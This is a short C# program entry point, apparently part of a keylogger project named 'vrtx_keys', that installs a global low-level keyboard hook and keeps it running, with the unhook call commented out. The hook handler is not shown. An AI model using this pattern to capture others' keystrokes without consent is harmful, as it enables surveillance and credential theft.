using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;

namespace vrtx_keys {
    class Program {
        private static IntPtr hook = IntPtr.Zero;

        static void Main(string[] args) {
            hook = KeyBoardListener.SetHook(KeyBoardListener.llkProcedure);
            Application.Run();
            //UnhookWindowsHookEx(hook);
        }
    }
}